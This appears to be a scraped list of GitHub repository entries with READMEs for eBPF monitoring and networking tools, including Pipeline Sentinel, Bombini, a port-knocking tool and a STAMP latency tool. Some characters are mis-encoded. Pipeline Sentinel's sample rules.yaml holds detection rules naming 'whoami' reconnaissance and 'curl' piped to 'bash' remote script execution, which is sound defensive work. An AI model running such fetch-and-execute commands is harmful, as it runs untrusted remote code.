 subgraph subGraph0[""Docker Container""]
    direction TB
        C[""Start Pipeline Sentinel""]
        D[/""rules.yaml""/]
        E[""Execute Build Command""]
        F{""Process Spawned?""}
        G[""Analyze Process Against Rule Set""]
        H{""Violation?""}
        I{""Critical Issue?""}
        L[""Log Violation & Add to Report""]
        J[""Allow Process""]
        K[""Block Process & Fail Build""]
  end
    C -- Loads --> D
    C --> E
    E -- Triggers --> F
    F -- Yes --> G
    F -- No ----> E
    G --> H
    H -- No --> J
    J -- Build Continues --> E
    H -- Yes --> I
    I -- Yes --> K
    I -- No --> L
    L -- then --> J
```

### Getting Started

## Prerequisites

* Go (1.23+)
* Docker
* clang, llvm, libbpf-dev, make, bpftool

## Local Build & Run

1. Build the application: `make build`
2. Build the Docker image: `docker build -t pipeline-sentinel-app .`
3. Run the container: This command runs the sentinel and mounts your local rules.yaml and a reports directory into the container.

``` bash
# Create the reports directory first
mkdir -p reports

# Run the container
sudo docker run -it --rm \
  --name sentinel-container \
  --cap-add=SYS_ADMIN \
  --pid=host \
  -v /sys/kernel/debug:/sys/kernel/debug:ro \
  -v ${PWD}/rules.yaml:/app/rules.yaml:ro \
  -v ${PWD}/reports:/app/reports \
  pipeline-sentinel-app
```

## Configuration (`rules.yaml`)

The detection logic is controlled by the `rules.yaml` file. The engine uses ""smart"" matching based on the number of items in the `match_all` list.

* Single-Item List: Triggers a precise ""whole word"" match. Ideal for single commands.
* Multi-Item List: Triggers a ""contains all substrings"" match. Ideal for complex patterns.

``` yaml
# rules.yaml

# This rule uses ""whole word"" matching and will trigger on 'whoami'
# but not on commands that simply contain the substring 'whoami'.
- id: recon_whoami
  description: ""Detects 'whoami' used for user discovery""
  severity: ""medium""
  match_all: 
    - ""whoami""

# This rule uses ""contains all"" matching and will trigger on any
# command that contains ""curl"", ""|"", and ""bash"".
- id: curl_remote_script_execution
  description: ""Detects downloading a remote script and executing it with a shell""
  severity: ""critical""
  match_all:
    - ""curl""
    - ""|""
    - ""bash""
```

## Usage in GitHub Actions

Pipeline Sentinel is designed to run as a service container in a CI/CD pipeline. The following is a two-job workflow that builds the tool and then uses it to monitor a test script.

Place this file in '''.github/workflows/sentinel-test.yml''':

``` yaml
name: Pipeline Sentinel CI

on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
    steps:
      - name: Check out repository
        uses: actions/checkout@v4
      - name: Log in to the GitHub Container Registry
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - name: Build and push Docker image
        run: |
          IMAGE_ID=ghcr.io/${{ github.repository }}:${{ github.sha }}
          docker build -t $IMAGE_ID .
          docker push $IMAGE_ID

  test-with-sentinel:
    needs: build
    runs-on: ubuntu-latest
    services:
      sentinel:
        id: sentinel
        image: ghcr.io/${{ github.repository }}:${{ github.sha }}
        credentials:
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
        options: >-
          --pid=host
          --cap-add=SYS_ADMIN
          -v /sys/kernel/debug:/sys/kernel/debug:ro
    steps:
      - name: Check out repository
        uses: actions/checkout@v4
      - name: Run Fake Build Script for Testing
        run: |
          chmod +x ./fake_build_script.sh
          ./fake_build_script.sh || true
      - name: Check Sentinel Logs and Finalize
        if: always()
        run: |
          echo ""--- Final Sentinel Logs ---""
          docker logs sentinel > sentinel-log.txt 2>&1
          cat sentinel-log.txt
          echo ""--- Checking for Critical Alerts ---""
          if grep -q ""CRITICAL"" sentinel-log.txt; then
            echo ""Build FAILED due to critical alert found in logs.""
            exit 1
          else
            echo ""Build successful. No critical alerts found.""
          fi
      - name: Upload Sentinel Log as Artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: sentinel-log-report
          path: sentinel-log.txt
```

## Future Work

* Output alerts in structured JSON format for easier machine parsing.
* Expand eBPF probes to monitor other syscalls (e.g., connect for network, open for files).
* Enhance the rule engine to support more advanced context (e.g., parent process matching).
* Add a main configuration file for the tool itself.

## Contributing

Contributions are welcome! Please feel free to open an issue or submit a pull request.

## License

This project is licensed under the MIT License.
"
SRodi/ebpf-server,17,2,17,0,Go,Data Backend server that uses eBPF to monitor network connections and provide real-time network analytics.,2025-07-29T15:23:45Z,2025-08-16T10:08:16Z,7,"# eBPF Network Monitor

[![CI](https://github.com/srodi/ebpf-server/actions/workflows/ci.yml/badge.svg)](https://github.com/srodi/ebpf-server/actions/workflows/ci.yml)
[![API Documentation](https://img.shields.io/badge/API-Documentation-blue?style=for-the-badge&logo=swagger)](https://petstore.swagger.io/?url=https://raw.githubusercontent.com/srodi/ebpf-server/main/docs/swagger/swagger.json)
[![OpenAPI Spec](https://img.shields.io/badge/OpenAPI-3.0-green?style=for-the-badge&logo=openapiinitiative)](docs/swagger.json)
[![Go Version](https://img.shields.io/badge/Go-1.23+-00ADD8?style=for-the-badge&logo=go)](https://golang.org)

A modular eBPF monitoring system with HTTP API server for real-time network and system event monitoring. **Supports both VM and Kubernetes deployments** with automatic metadata enrichment.

## ðŸš€ Deployment Options

### Kubernetes Deployment (Recommended)

Deploy across your entire Kubernetes cluster with automatic node metadata enrichment:

```bash
# Quick deployment with built-in script
./scripts/deploy.sh all --registry your-registry.com

# Or step by step
make docker-build
make docker-push REGISTRY=your-registry.com
make k8s-deploy
```

**ðŸ“– [Complete Kubernetes Guide](kubernetes/README.md)** - Detailed setup and configuration

### Local Testing with Kind

Test the full Kubernetes deployment locally:

```bash
# Full automated test
make kind-full-test

# Or step by step:
make kind-cluster-create    # Create local cluster
make kind-deploy           # Deploy to kind cluster  
make kind-integration-test # Run comprehensive tests
```

To get detailed API documentation for the aggregator, available only in Kubernetes mode [see API Aggregator Documentation](https://petstore.swagger.io/?url=https://raw.githubusercontent.com/srodi/ebpf-server/main/docs/swagger-aggregator/swagger.json)

### VM Deployment (Traditional)

For single-server deployments:

```bash
# Install dependencies (Ubuntu/Debian)
sudo apt install -y golang-go clang libbpf-dev linux-headers-$(uname -r)

# Build and run
make build
sudo ./bin/ebpf-server

# Test the API
curl http://localhost:8080/health
curl ""http://localhost:8080/api/events?type=connection&limit=10""
```

**ðŸ“š [Interactive API Documentation](https://petstore.swagger.io/?url=https://raw.githubusercontent.com/srodi/ebpf-server/main/docs/swagger/swagger.json)** - Test APIs in your browser

## âœ¨ Key Features

### ðŸ”„ Dual Deployment Support
- **Kubernetes Mode**: DaemonSet + Aggregator architecture for cluster-wide monitoring
- **VM Mode**: Traditional single-server deployment
- **Automatic Detection**: Seamlessly detects environment and adapts behavior

### ðŸ·ï¸ Kubernetes Metadata Enrichment  
Events in Kubernetes include rich metadata:
```json
{
  ""id"": ""abc123"",
  ""type"": ""connection"",
  ""k8s_node_name"": ""worker-node-1"",
  ""k8s_pod_name"": ""ebpf-monitor-xyz"",
  ""k8s_namespace"": ""ebpf-system"",
  ...
}
```

### ðŸ—ï¸ Scalable Architecture

**Kubernetes Mode**: Distributed monitoring with centralized aggregation
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    Kubernetes Cluster                   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚    Node 1   â”‚  â”‚    Node 2   â”‚  â”‚        Node N   â”‚  â”‚
â”‚  â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚  â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚  â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚  â”‚
â”‚  â”‚ â”‚ eBPF    â”‚ â”‚  â”‚ â”‚ eBPF    â”‚ â”‚  â”‚   â”‚ eBPF    â”‚   â”‚  â”‚
â”‚  â”‚ â”‚ Agent   â”‚ â”‚  â”‚ â”‚ Agent   â”‚ â”‚  â”‚   â”‚ Agent   â”‚   â”‚  â”‚
â”‚  â”‚ â”‚+K8s Metaâ”‚ â”‚  â”‚ â”‚+K8s Metaâ”‚ â”‚  â”‚   â”‚+K8s Metaâ”‚   â”‚  â”‚
â”‚  â”‚ â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜ â”‚  â”‚ â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜ â”‚  â”‚   â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜   â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚         â”‚                â”‚                  â”‚           â”‚
â”‚         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜           â”‚
â”‚                          â”‚                              â”‚
â”‚                    â”Œâ”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”                        â”‚
â”‚                    â”‚   eBPF    â”‚                        â”‚
â”‚                    â”‚ Aggregatorâ”‚â—„â”€â”€â”€ Unified API        â”‚
â”‚                    â”‚           â”‚                        â”‚
â”‚                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**VM Mode**: Modular, interface-based monitoring system
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     eBPF Programs                   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚ Connection  â”‚  â”‚ Packet Drop â”‚  â”‚   Custom    â”‚  â”‚
â”‚  â”‚ Monitor     â”‚  â”‚ Monitor     â”‚  â”‚   Monitors  â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”˜  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼-â”€â”€â”€â”€â”€â”˜
          â”‚                 â”‚                  â”‚
          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â–¼
               â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
               â”‚    Event Processing     â”‚
               â”‚   (Manager + Storage)   â”‚
               â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                             â–¼
               â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
               â”‚       HTTP API          â”‚
               â”‚    (/api/events)        â”‚
               â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### ðŸ“Š Unified Monitoring
- **Cross-Node Correlation**: View events across entire Kubernetes cluster
- **Node-Specific Filtering**: Query events by specific nodes or pods
- **Aggregated Statistics**: Cluster-wide event statistics and metrics
- **Backward Compatible**: Existing VM deployments continue unchanged

## ðŸ“¡ API Features

- **Unified Event API**: Single `/api/events` endpoint for all monitoring data
- **Flexible Filtering**: Filter by event type, PID, command, and time windows  
- **Kubernetes Filtering**: Filter by node name, pod name, or namespace
- **Program Status**: View program status and metrics via `/api/programs`
- **Auto-Generated Documentation**: OpenAPI 3.0 spec from code annotations
- **Interactive Testing**: Built-in Swagger UI for API exploration

### Core Endpoints

- **`GET /health`** - System health and status
- **`GET /api/events`** - Query events with filtering support
- **`GET /api/programs`** - List all programs and their status

### Query Examples

```bash
# Get all connection events from the last hour
curl ""http://localhost:8080/api/events?type=connection&since=2023-01-01T00:00:00Z""

# Get events for a specific process
curl ""http://localhost:8080/api/events?pid=1234&limit=50""

# Kubernetes: Get events from specific node
curl ""http://localhost:8080/api/events?k8s_node_name=worker-1""
```

### Query Parameters

- `type`: Event type filter (e.g., ""connection"", ""packet_drop"")
- `pid`: Process ID filter
- `command`: Command name filter
- `k8s_node_name`, `k8s_pod_name`, `k8s_namespace`: Kubernetes filters
- `since`, `until`: RFC3339 timestamp filters
- `limit`: Maximum results (default: 100)

## ðŸ› ï¸ Development

```bash
# Development build with debug logging
make build-dev && sudo ./bin/ebpf-server-dev

# Generate API docs
make docs

# Run tests
make test

# Build eBPF programs
make build-bpf
```

**ðŸ“š [Complete Development Guide](docs/program-development.md)** - Detailed guide for creating new eBPF monitoring programs

## ðŸ“ Project Structure

```
â”œâ”€â”€ cmd/                 # Application entry points
â”‚   â”œâ”€â”€ server/         # eBPF monitoring server
â”‚   â””â”€â”€ aggregator/     # Kubernetes aggregator
â”œâ”€â”€ internal/
â”‚   â”œâ”€â”€ core/          # Core interfaces and types
â”‚   â”œâ”€â”€ events/        # Event system (BaseEvent, streams)
â”‚   â”œâ”€â”€ programs/      # eBPF program implementations
â”‚   â”œâ”€â”€ storage/       # Event storage and querying
â”‚   â”œâ”€â”€ api/          # HTTP API handlers
â”‚   â”œâ”€â”€ kubernetes/   # Kubernetes metadata integration
â”‚   â””â”€â”€ system/       # System initialization
â”œâ”€â”€ bpf/              # eBPF C programs and headers
â”œâ”€â”€ kubernetes/       # Kubernetes manifests
â”œâ”€â”€ scripts/          # Deployment and testing scripts
â””â”€â”€ docs/            # Documentation and API specs
```

## ðŸ”§ Requirements

- **Linux kernel 4.18+** with eBPF support
- **Root privileges** for eBPF program loading  
- **Dependencies**: Go 1.23+, Clang, libbpf-dev, kernel headers
- **Kubernetes**: 1.20+ (for K8s deployment)

**ðŸ“– Setup Guide**: [docs/setup.md](docs/setup.md)

## ðŸ“„ License

MIT License - see [LICENSE](LICENSE) file.
"
bombinisecurity/bombini,33,2,33,0,Rust,eBPF Security Monitoring Agent Based on Aya,2024-09-28T18:35:24Z,2025-10-12T16:54:13Z,239,"# bombini

Bombini is an eBPF-based agent for security monitoring. It is build on a
top of [Aya](https://github.com/aya-rs/aya) library. Design concepts can be
found [here](docs/design.md).

## Run

Your Linux kernel version must be greater or equal **5.15**.
[Compatibility](https://github.com/aya-rs/aya/issues/349) between different kernel versions (CO-RE) is not yet fully implemented.

The easiest way to use Bombini is to build docker image and run:

```bash
docker build  -t bombini .
```

Before run, check if LSM BPF is enabled on your system.

```
cat /sys/kernel/security/lsm
```

if there is `bpf` in the output, than BPF LSM is enabled.
Otherwise, you have to enable it adding this line to `/etc/default/grub`:

```
GRUB_CMDLINE_LINUX=""lsm=[previos lsm modules],bpf""
```

Update grub and reboot the system.

Prepare configuration files and enable detectors for your needs. You can copy `./config` directory and modify config files.
`config.yaml` has global Bombini parameters and enumerates detectors to be loaded. Other config files provides parameters for corresponding detector.
To know more about detectors look at [docs](docs/detectors/).

Run bombini:

```bash
docker run --pid=host --rm -it --privileged --env ""RUST_LOG=info"" -v <your-config-dir>:/usr/local/lib/bombini/config:ro  -v /sys/fs/bpf:/sys/fs/bpf bombini
```

You can also use file as output or unix socket combining with
[vector](https://github.com/vectordotdev/vector).

### File
```bash
touch /tmp/bombini.log
docker run --pid=host --rm -it --privileged --env ""RUST_LOG=info"" -v <your-config-dir>:/usr/local/lib/bombini/config:ro -v /tmp/bombini.log:/log/bombini.log -v /sys/fs/bpf:/sys/fs/bpf bombini --event-log /log/bombini.log
```

### Unix socket
```bash
vector --config ./vector/vector-sock.yaml
docker run --pid=host --rm -it --privileged --env ""RUST_LOG=info"" -v <your-config-dir>:/usr/local/lib/bombini/config:ro -v /tmp/bombini.sock:/log/bombini.sock -v /sys/fs/bpf:/sys/fs/bpf bombini --event-socket /log/bombini.sock
```

## Build

1. Install [Rust](https://www.rust-lang.org/tools/install).
2. Prepare environment for [Aya](https://aya-rs.dev/book/start/development/).

If you building Bombini on Linux kernel with version **6.8.0-62-generic**, you can skip the next step.
Otherwise, please, regenerate `vmlinux.rs` before building:

```bash
./bombini-detectors-ebpf/generate_vmlinux.sh
```
Release build:

```bash
cargo xtask build --relese
```
You can generate a tarball with instalation scripts for bombini systemd service:

```bash
cargo xtask tarball --relese
```

Release tarball will be located at `target/bombini.tar.gz`

You can run bombini this way:

```bash
RUST_LOG=info sudo -E ./target/release/bombini --bpf-objs ./target/bpfel-unknown-none/release --config-dir ./config --stdout
```

Or using cargo:

```bash
RUST_LOG=info cargo xtask run --release -- --bpf-objs ./target/bpfel-unknown-none/release --config-dir ./config --stdout
```"
h0x0er/ebpf-snippets,17,2,17,0,,Code-snippets for developing eBPF programs,2025-08-15T12:50:45Z,2025-10-10T14:40:18Z,30,"# eBPF Snippets

Code-snippets for developing eBPF programs

![alt text](./media/usage.gif)


## Install

### Within vscode

- Search for `@category:""snippets"" ebpf-snippets` in extensions and click `install`

OR

- Install using `ext install`

![alt text](./media/install-ext.png)


### From github-release

1. GOTO latest [release](https://github.com/h0x0er/ebpf-snippets/releases) and download the `vsix` file.

![alt text](./media/release.png)

2. In vscode, hit `ctrl+shift+p`,
   1. type `install from vsix` hit-enter, then
   2. choose the downloaded `vsix file`

![alt text](./media/install-vscode.png)

**Enjoy :)**



## References

- https://docs.ebpf.io/
- https://docs.kernel.org/bpf/libbpf/program_types.html
- for `prog_type` and `prog_context`: https://elixir.bootlin.com/linux/v6.13.6/source/include/linux/bpf_types.h
- for `prog_section`: https://elixir.bootlin.com/linux/v6.13.6/source/tools/lib/bpf/libbpf.c#L9403

## Contribution

Improvements to **eBPF-snippets** are always welcome !  
If youâ€™d like to contribute, feel free to open an issue or submit a pull request.  
"
free5gc/gtp5g-tracer,2,0,2,0,C,Debug gtp5g kernel module using eBPF,2025-08-04T06:17:14Z,2025-10-03T09:37:35Z,4,"# gtp5g-tracer

## Prerequisites

Build gtp5g.ko with BTF support
```sh
$ cp /sys/kernel/btf/vmlinux /usr/lib/modules/$(uname -r)/build/
$ cd <GTP5G_SOURCE_DIR>
$ make
$ sudo make install
```

## Build

```sh
$ make dep # for first time
$ make
```

## Run

```sh
$ sudo ./main
```

## Debugging

To view the trace output, you can use the following command:

```sh
$ sudo cat /sys/kernel/debug/tracing/trace_pipe
```

## Notes

### List available functions in GTP5G

This command lists all available functions in the GTP5G kernel module that can be used for tracing:

```sh
sudo cat /sys/kernel/tracing/available_filter_functions | grep ""gtp5g""
```"
rhargreaves/knock-knock,8,1,8,0,Python,Port knocking implementation in eBPF ,2025-08-10T20:00:02Z,2025-08-31T23:13:22Z,109,"# Knock Knock :punch::punch::door:
[![build](https://github.com/rhargreaves/knock-knock/actions/workflows/build.yml/badge.svg)](https://github.com/rhargreaves/knock-knock/actions/workflows/build.yml)

Port knocking implementation in eBPF

## Features

* Protects TCP ports using port knocking, dropping packets until the correct sequence of UDP packets is received
* A sequence of up to 10 UDP packets can be used to protect a port
* Configurable sequence timeout resets the sequence after a period of time
* Configurable session timeout resets the session (blocks packets again) after a period of time

## Components

* Kernel-space BPF program (`knock.bpf.c` et al)
* User-space BPF program loader & configurator CLI tool (`main.cpp` et al)
* Acceptance tests (`test_knock.py` et al)

## Getting Started

Use the Dev Container as the main development environment.

### Build

1. Initialize submodules: `git submodule update --init --recursive`
2. Build the program:

```sh
make build
```

### Test

```sh
make test
```

## Usage

Run as root:

```
build/knock <interface> <target_port> <sequence> <options>
```

* `interface`: Network interface to attach to (e.g., `eth0`, `lo`)
* `target_port`: Port to protect
* `sequence`: Knock sequence ports (space-separated)
* `options`: Optional arguments:
  * `-t`, `--timeout`: Sequence timeout in milliseconds
  * `-s`, `--session-timeout`: Session timeout in milliseconds

Use `--help` to see all options.

## Examples

### Example 1

* Attach to interface `eth0`
* Protect port 8080 with a sequence of 123, 456, 789
* Sequence timeout is 5 seconds (default)
* Session timeout is 60 seconds (default)

```sh
build/knock eth0 8080 123 456 789
```

### Example 2

* Attach to interface `eth0`
* Protect port 8080 with a sequence of 1111, 2222, 3333, 4444
* Sequence timeout is 5 seconds
* Session timeout is 1 hour

```sh
build/knock eth0 8080 1111 2222 3333 4444 -t 5000 -s 3600000
```

## Logging

Program logs various events to the kernel trace buffer. To view the trace, run (as root):

```sh
cat /sys/kernel/debug/tracing/trace_pipe
```"
viktordoronin/stamp-bpf,11,1,11,2,Go,,2025-08-14T16:48:17Z,2025-09-19T19:24:41Z,67,"# STAMP implementation for Go
This is a STAMP Protocol([RFC 8762](https://datatracker.ietf.org/doc/html/rfc8762)) implementation using Go and eBPF. So far it only implements stateless unauthenticated mode and only supports amd64(if you have an ARM machine please consider contributing to a port!). It's a fully functional implementation, although I've yet to test it against an actual STAMP-capable network device like Cisco or Juniper.

[](https://github.com/user-attachments/assets/5e2eb5ed-a97a-4634-9ed6-c5676a687a51)

## Requirements
- 6.6 kernel
- either root(sudo) or [Linux capabilities](#caps)

## Caps
- Capabilities are special privileges that are set per-program basis
- BPF portion requires CAP_BPF and CAP_NET_ADMIN
- CAP_NET_BIND_SERVICE is required for `sender` if we dial from **SOURCE** port 862
- Bash: `sudo setcap 'cap_bpf=ep cap_net_admin=ep cap_net_bind_service=ep' <binary>` to give caps to your binary
- You can also set them in Docker Compose(utilized in the demo)

## Demo
You're provided with a quick proof-of-concept demo that uses Docker to simulate a STAMP session. Unzip and run `demo.sh`.

## Reflector
`reflector` takes interface name, attaches to that interface and listens(not really since it's a BPF filter) on port 862 (`-p` to specify another):
```
reflector eth0 -p 1000
```
`reflector` can handle several sessions at once and doesn't keep track of individual sessions (stateful mode) at this time. 

**IMPORTANT**: `reflector` needs to remain running in order for the program to function; use `&` if you'll need to use the same shell

## Sender
`sender` takes interface name and IP, attaches the BPF components to provided interface and starts sending packets to that IP to and from port 862(`-d` and `-s` respectively to specify a different port):
```
sender eth0 111.222.33.44 -c100 -i 0.5 -d 1000 -s 1001
```
There are `ping`-like options for packet count(`-c`) and send interval(`-i`). If you specified a finite number of packets to send it will quit on its own once all packets are accounted for(received or lost). It only does one STAMP session at a time. 

## Troubleshooting
`stamp-bpf` emits descriptive messages in case of error, however, not every error can be accounted for so here's some pointers for potential problems. Also see [here](#desync) for potential clock synchronization issues.

### BPF
If instead of `All programs successfully loaded and verified` line you get an error, it means the BPF program has failed to load. Obviously, I test my code to ensure this doesn't happen, so any and all such occurences are likely caused by system configuration. Make sure your kernel version matches the requirements, or there are possibly some [kernel flags](https://eunomia.dev/en/tutorials/bcc-documents/kernel_config_en/) that are missing.

### Network issues
Once the program has successfully started, you might see that packets are being sent but none are coming back. 
- Check your network and/or firewall configuration - something might be blocking traffic
- Make sure reflector is running on the receiving side
- Make sure you're sending packets to the right IP
- Make sure you're listening on the correct network device - both for sender and reflector
- If all else fails and you're filing a bug report, please include a Wireshark pcap from both sender and reflector sides if possible

## Clock syncing
It's important to have clock synchronization between the two machines to ensure precise measurements; however, due to overall complexity of the topic, system clock synchronization is largely left up to the system admin. Nonetheless, there are some features present to help you figure things out.

### TAI offset
TAI is the only clock that's available for eBPF programs([docs](https://docs.ebpf.io/linux/helper-function/bpf_ktime_get_tai_ns/)) so this is what we use for measurements. There is a problem, however: TAI clock is supposed to be offset from UTC by a number of leap seconds(37 as of 2025), which isn't guaranteed on all systems and can produce considerable desync if one machine has its TAI clock offset and the other doesn't. `stamp-bpf` can automatically detect and account for this, adding 37 seconds to its TAI clock if needed. [See here if you want to fix this on your system](https://superuser.com/questions/1156693/is-there-a-way-of-getting-correct-clock-tai-on-linux), although it's not necessary for this program to function. 

### System synchronization
`stamp-bpf` also offers clock synchronization detection, which comes in two flavors: general sync detection and PTP detection. 

#### General sync detection
This works by calling `adjtimex()` and detects if there's any kind of system clock adjustment(implying synchronization effort) going on. Should be reliable for any Linux system.

#### PTP detection
This one is a lot more finnicky and makes some assumptions. Basically, we assume that the system is using `linuxptp` to enable PTP, and given how `linuxptp` tools(namely `ptp4l`) print to systemlog, we use Bash to grep it for recent `ptp4l` records.
This will give a false negative if:
- Your system doesn't have `systemd`
- Your `linuxptp` tools are configured to output no logs
- You're using a different PTP tool(please let me know if you do and I'll do my best to improve detection)
- Your system somehow doesn't have `grep` or `tail`

#### Synchronization enforcement
There are two CLI flags for if you really care about clock syncing and don't want to make measurements unless it is present.
- `--enforce-sync` will abort execution if general sync detection returns a negative
- `--enforce-ptp` will abort execution if PTP detection returns a negative

### Desync
Nonetheless, despite all your efforts, you might see an output that looks like this:
![](assets/desync.png)
In this case, attempting to calculate latency from two timestamps results in a negative number, which causes a variable overflow. This happens if the delta between two machines' clocks is larger than actual network latency between the machines. It's not necessarily lack of synchronization - in this screenshot, both machines are NTP-synced to the same server, however I'm testing over LAN so the network latency is low enough for this to still happen. Note that you can still trust roundtrip measurement as both timestamps for it are made on the sender machine. If you want to test over low-latency networks like LANs, consider enabling PTP and ensuring both machines syncronize to the same master clock.

(also note that the 37s delay due to lack of TAI offset is present on the far-end, although that isn't the root cause and the issue was still present with TAI clocks properly offset on both machines)

## Histogram
`stamp-bpf` includes option for histogram output. A histogram consists of N bins(configurable), each counting packets that fall into the bin's latency range. It's output in the form of a simple text file, interpretation and visualization of which is left up to the user. 
- `--hist <bins> <min> <max>` in CLI to enable histogram output
- `--histpath <path>` to provide path for output file
- Leftmost and rightmost bins are reserved for outlier packets that fall outside of specified min-max range
- Min-max range is divided equally among the remaining bins
- Each bin counts packets that fell into its range
- For sender, the histogram is saved only when the session concludes, but not when program exits prematurely or it's set to send infinite packets
- For reflector, the histogram is updated on each arriving packet - yes, this doesn't work well when reflector receives several sessions at once, not until I implement Stateful mode. 
- To enable this on the reflector, additionally specify `--output` flag

## Upcoming features
- Stateful mode([RFC](https://datatracker.ietf.org/doc/html/rfc8762#name-theory-of-operation)) - have `reflector` track individual sessions and get directional packet loss measurements at the end of a test.
- Unified binary - `stamp reflector ...` or `stamp sender ...` for easier distribution and deployment. Docker image will be published when this feature is released.
- Network daemon mode for `reflector` - utilize BPF pinning to load, unload and reattach the BPF programs without having to keep the userspace component running similar to `tc qdisc add/change/del` syntax.
- ARM and other architecture support
- Authenticated mode([RFC](https://datatracker.ietf.org/doc/html/rfc8762#name-session-sender-packet-format)) - encrypt your sessions to make sure your measurements can be trusted.
- Protocol extensions - RFCs [8972](https://datatracker.ietf.org/doc/rfc8972/) and [9503](https://datatracker.ietf.org/doc/rfc9503/)

## About STAMP
STAMP is a network performance measurement protocol that provides metrics for individual directions(near-end and far-end). This implementation uses eBPF TC Classifier programs to timestamp the packets directly inside the Linux networking stack to minimize processing delay factor in measurements. 

### Packet flow
0. Sender and reflector BPF programs are loaded and attached ahead of time
1. STAMP packet is formed in the userspace with just the sequence number populated
2. Sender's egress filter catches it and populates Timestamp 1
3. Reflector's ingress filter catches the packet and:
   - Populates Timestamp 2 as soon as the packet arrives
   - Swaps the packet's IP, port and MAC in order to send it back
   - Redirects it back onto the interface
4. Reflector's egress filter catches the outgoing packet and populates Timestamp 3
5. Sender's ingress filter catches the packet coming back and:
   - Notes Timestamp 4 right away
   - Strips the other 3 timestamps from the packet
   - Calculates Near-end, Far-end and Roundtrip latencies off of timestamps...
   - ... and passes that information back to userspace
   - Userspace program processes the samples, calculates the actual metrics and prints them out

![](assets/chart.png)
(I'll make a better chart soon)
"
dynatrace-oss/koney,72,7,72,20,Go,"Koney is a Kubernetes operator that enables you to define so-called deception policies for your cluster. Koney automates the setup, rotation, and teardown of honeytokens and fake API endpoints, and uses eBPF to detect, log, and forward alerts when your traps have been accessed.",2025-02-04T09:12:36Z,2025-10-09T15:56:00Z,30,"<!-- markdownlint-disable no-inline-html first-line-h1 -->

<p align=""center"">
  <img alt=""Koney Logo"" width=""128px"" src=""./docs/images/koney.png"" />
</p>

# Koney: Automated Cyber Traps for Cloud-Native Apps

